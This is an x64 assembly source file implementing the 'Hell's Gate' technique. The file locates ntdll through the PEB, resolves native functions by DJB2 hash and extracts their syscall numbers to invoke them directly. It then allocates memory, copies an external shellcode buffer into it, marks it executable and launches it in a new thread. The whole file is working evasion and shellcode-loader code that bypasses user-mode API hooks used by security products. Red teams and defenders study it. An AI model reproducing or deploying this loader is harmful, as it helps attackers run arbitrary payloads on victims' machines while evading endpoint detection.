; @file			HELLSGATE.ASM
; @data			07-08-2020
; @author		Paul Laîné (@am0nsec)
; @version		1.0
; @brief		Dynamically extracting and invoking syscalls from in-memory modules.
; @details		
; @link			https://ntamonsec.blogspot.com/
; @copyright	This project has been released under the GNU Public License v3 license.

include HELLSGATE.INC

_DATA segment
    extern Shellcode: BYTE
    extern ShellcodeLength: QWORD

    wSystemCall   DWORD 000h
    lpAddress     QWORD ?
    sDataSize     QWORD ? 
    OldProtect    QWORD ?
    hThreadHandle QWORD ? 

    VXTable       VX_TABLE <>
    Timeout       LARGE_INTEGER <>
_DATA ends

_TEXT segment
    SystemCall PROC
        mov r10, rcx
        syscall
        ret
    SystemCall ENDP

    HellsGate PROC
_start:
        mov r8, gs:[60h]                                                  ; Get process environment block (PEB)
        cmp [r8].PEB.OSMajorVersion, 0Ah                                  ; 
        jne _failure                                                      ; Jump if not Windows 10

        ; Get the base address of ntdll
        mov r8, [r8].PEB.Ldr                                              ; 
        mov r8, [r8].PEB_LDR_DATA.InMemoryOrderModuleList.Flink - 10h     ; First loaded module: e.g. hellsgate.exe
        mov r8, [r8].LDR_DATA_TABLE_ENTRY.InMemoryOrderLinks.Flink - 10h  ; Second loaded module: e.g. ntdll.dll
        mov r8, [r8].LDR_DATA_TABLE_ENTRY.DllBase                         ; Image base of the module
        mov r9, r8                                                        ; Store for later use

        ; Get module export directory
        cmp [r8].IMAGE_DOS_HEADER.e_magic, 5A4Dh                          ; DOS Header --> MZ
        jne _failure                                                      ; 

        mov ebx, [r8].IMAGE_DOS_HEADER.e_lfanew                           ; RVA of IMAGE_NT_HEADERS64
        add r8, rbx                                                       ; 
        cmp [r8].IMAGE_NT_HEADERS64.Signature, 00004550h                  ; NT Header --> PE00
        jne _failure                                                      ; 

        mov ebx, IMAGE_NT_HEADERS64.OptionalHeader                        ; RVA of IMAGE_OPTIONAL_HEADER64
        add r8, rbx                                                       ;                                              
        cmp [r8].IMAGE_OPTIONAL_HEADER64.Magic, 20bh                      ; Optional header --> 0x20b
        jne _failure                                                      ;

        lea r8, [r8].IMAGE_OPTIONAL_HEADER64.DataDirectory                ; First entry of the DataDirectory array
        mov ebx, [r8].IMAGE_DATA_DIRECTORY.VirtualAddress                 ; RVA of IMAGE_EXPORT_DIRECTORY
        mov r8, r9                                                        ; ImageBase
        add r8, rbx                                                       ; Module + RVA

        ; Push function hashes
        mov VXTable.NtAllocateVirtualMemory.dwHash, 002B73D648h          ; DJB2 hash of NtAllocateVirtualMemory
        mov VXTable.NtProtectVirtualMemory.dwHash,  00FE950644h          ; DJB2 hash of NtProtectVirtualMemory
        mov VXTable.NtCreateThreadEx.dwHash,        00B151D7ACh          ; DJB2 hash of NtCreateThreadEx
        mov VXTable.NtWaitForSingleObject.dwHash,   0091F4EA38h          ; DJB2 hash of NtWaitForSingleObject
            
        xor r15, r15                                                     ; Clean R15 register
        mov r15b, 4h                                                     ; Move to R15 number of functions to find
            
        mov ebx, [r8].IMAGE_EXPORT_DIRECTORY.AddressOfNames              ; Address of the function name
        mov r12, r9                                                      ; Function name RVA
        add r12, rbx                                                     ; ImageBase + RVA

        mov ebx, [r8].IMAGE_EXPORT_DIRECTORY.AddressOfFunctions          ; Address of function pointers
        mov r13, r9                                                      ; 
        add r13, rbx                                                     ;

        mov ebx, [r8].IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals       ; Address of function ordinals
        mov r14, r9                                                      ;
        add r14, rbx                                                     ;

        mov ecx, [r8].IMAGE_EXPORT_DIRECTORY.NumberOfNames               ; Total number of named functions
        dec ecx 

;-----------------------------------------------------------------------------
; Find function ordinal index w/ function name hash
;-----------------------------------------------------------------------------
_parse_functions_name:
        mov rbx, 4h                                                      ; sizeof(DWORD)
        imul rbx, rcx                                                    ; siezof(DWORD) * RCX
        mov esi, [r12 + rbx]                                             ; Function RVA 
        add rsi, r9                                                      ; Function RVA + ImageBase
            
        mov r10d, 5381h                                                  ; hash = 0x5381
_djb2:
        mov r11d, r10d                                                   ; Store original hash value for later
        shl r10d, 5                                                      ; hash << 5 
        add r10d, r11d                                                   ; (hash << 5) + hash

        xor r11d, r11d                                                   ; Clean temporary hash value
        mov r11b, byte ptr [rsi]                                         ; Get ASCII char
        add r10d, r11d                                                   ; ((hash << 5) + hash) + char

        inc rsi                                                          ; Next string char
        cmp byte ptr [rsi], 00h                                          ; End of string
        jne _djb2                                                        ;

        lea rax, VXTable                                                 ; Address of VX table
        mov rdx, VXTableEntrySize                                        ; RDX = sizeof(VX_TABLE_ENTRY)
        imul rdx, r15                                                    ; RDX = sizeof(VX_TABLE_ENTRY) * R15
        sub rdx, 10h                                                     ; RDX = (sizeof(VX_TABLE_ENTRY) * R15) - sizeof(VX_TABLE_ENTRY)
        add rax, rdx                                                     ; RAX = VX_TABLE[RDX].pAddress = RBX
        xor r10d, [rax].VX_TABLE_ENTRY.dwHash                            ; Check if function has been found
        jz _get_function_address                                         ;
        loop _parse_functions_name                                       ;

;-----------------------------------------------------------------------------
; Find the function address w/ function ordinal
;-----------------------------------------------------------------------------
_get_function_address:
        mov rax, 2h                                                      ; sizeof(WORD)
        imul rax, rcx                                                    ; sizeof(WORD) * RCX
        mov ax, [r14 + rax]                                              ; AX = function ordinal
            
        imul rax, 4                                                      ; sizeof(DWORD) * ordinal
        mov eax, [r13 + rax]                                             ; RVA of function
        mov rbx, r9                                                      ; RBX = ImageBase
        add rbx, rax                                                     ; RBX = address of function

        lea rax, VXTable                                                 ; Address of VX table
        mov rdx, VXTableEntrySize                                        ; RDX = sizeof(VX_TABLE_ENTRY)
        imul rdx, r15                                                    ; RDX = sizeof(VX_TABLE_ENTRY) * R15
        sub rdx, 10h                                                     ; RDX = (sizeof(VX_TABLE_ENTRY) * R15) - sizeof(VX_TABLE_ENTRY)
        add rax, rdx                                                     ; RAX = VX_TABLE[RDX].pAddress = RBX
        mov [rax].VX_TABLE_ENTRY.pAddress, rbx                           ; 

;-----------------------------------------------------------------------------
; Find the function system call w/ function address
;-----------------------------------------------------------------------------
_get_function_syscall:
        inc rbx
        cmp byte ptr [rbx], 00C3h                                        ; Check if RET
        je _failure                                                      ;

        cmp word ptr [rbx], 050Fh                                        ; Check if syscall
        jne _get_function_syscall                                        ; 

        sub rbx, 0Eh                                                     ; Address of system call
        mov cx, word ptr [rbx]                                           ; CX = system call

        lea rax, VXTable                                                 ; Address of VX table
        mov rdx, VXTableEntrySize                                        ; RDX = sizeof(VX_TABLE_ENTRY)
        imul rdx, r15                                                    ; RDX = sizeof(VX_TABLE_ENTRY) * R15
        sub rdx, 10h                                                     ; RDX = (sizeof(VX_TABLE_ENTRY) * R15) - sizeof(VX_TABLE_ENTRY)
        add rax, rdx                                                     ; RAX = VX_TABLE[RDX].pAddress = RBX
        mov [rax].VX_TABLE_ENTRY.wSystemCall, cx                         ; 

_reset_loop:
        ; Move to the next function
        mov ecx, [r8].IMAGE_EXPORT_DIRECTORY.NumberOfNames               ; Reset counter
        dec ecx                                                          ;
        dec r15                                                          ; Check if all function have been found
        jnz _parse_functions_name                                        ;

;-----------------------------------------------------------------------------
; Execute the payload
;-----------------------------------------------------------------------------
_payload:
        ; Initialise variables
        mov r10, ShellcodeLength                                         ;
        mov sDataSize, r10                                               ; Store shellcode length
        mov lpAddress, 0h                                                ; 

        ; Execute NtAllocateVirtualMemory
        mov ax, VXTable.NtAllocateVirtualMemory.wSystemCall              ;
        mov rcx, 0FFFFFFFFFFFFFFFFh                                      ; ProcessHandle
        lea rdx, lpAddress                                               ; BaseAddress 
        xor r8,  r8                                                      ; ZeroBits
        lea r9, sDataSize                                                ; RegionSize
        mov qword ptr [rsp + 20h], 3000h                                 ; AllocationType
        mov qword ptr [rsp + 28h], 4                                     ; Protect

        call SystemCall                                                  ;
        cmp eax, 00h                                                     ; (NTSTATUS  != 0)
        jne _failure                                                     ;

        ; Copy shellcode
        cld                                                              ; Clear direction flag == forward copy
        lea rsi, Shellcode                                               ; Origin
        mov rdi, lpAddress                                               ; Destination
        mov rcx, ShellcodeLength                                         ; Size of shellcode
        rep movsb                                                        ; Copy byte until RCX = 0

        ; Execute NtProtectVirtualMemory
        mov ax, VXTable.NtProtectVirtualMemory.wSystemCall               ;
        mov rcx, 0FFFFFFFFFFFFFFFFh                                      ; ProcessHandle
        lea rdx, lpAddress                                               ; BaseAddress
        lea r8, sDataSize                                                ; NumberOfBytesToProtect
        mov r9d, 20h                                                     ; NewAccessProtection        

        mov OldProtect, 00h                                              ;
        lea r11, OldProtect                                              ;
        mov qword ptr [rsp + 20h], r11                                   ; OldAccessProtection

        call SystemCall                                                  ;
        cmp eax, 00h                                                     ; (NTSTATUS  != 0)
        jne _failure                                                     ;

        ; Execute NtCreateThreadEx
        mov ax, VXTable.NtCreateThreadEx.wSystemCall
        mov hThreadHandle, 0                                             ;
        lea rcx, hThreadHandle                                           ; hThread
        mov rdx, 1FFFFFh                                                 ; DesiredAccess
        xor r8, r8                                                       ; ObjectAttributes
        mov r9, 0FFFFFFFFFFFFFFFFh                                       ; ProcessHandle
        mov r10, lpAddress                                               ;
        mov qword ptr [rsp + 20h], r10                                   ; lpStartAddress
        mov qword ptr [rsp + 28h], 00h                                   ; lpParameter
        mov qword ptr [rsp + 30h], 00h                                   ; Flags
        mov qword ptr [rsp + 38h], 00h                                   ; StackZeroBits
        mov qword ptr [rsp + 40h], 00h                                   ; SizeOfStackCommit
        mov qword ptr [rsp + 48h], 00h                                   ; SizeOfStackReserve
        mov qword ptr [rsp + 50h], 00h                                   ; lpBytesBuffer

        call SystemCall                                                  ;
        cmp eax, 00h                                                     ; (NTSTATUS  != 0)
        jne _failure                                                     ;

        ; Execute NtWaitForSingleObject
        mov ax, VXTable.NtWaitForSingleObject.wSystemCall                ; 
        mov rcx, hThreadHandle                                           ; ObjectHandle
        xor rdx, rdx                                                     ; Alertable

        mov Timeout, 0FFFFFFFFFF676980h                                  ; TimeOut 
        lea r8, Timeout                                                  ; 

        call SystemCall                                                  ;
        cmp eax, 00h                                                     ; (NTSTATUS  != 0)
        jne _failure                                                     ;

;-----------------------------------------------------------------------------
; Successfully execution of the function
;-----------------------------------------------------------------------------
_success:
        mov rax, 1
        ret

;-----------------------------------------------------------------------------
; In case something goes wrong
;-----------------------------------------------------------------------------
_failure:
        xor rax, rax
        ret
    HellsGate ENDP
_TEXT ends

; end of file
end
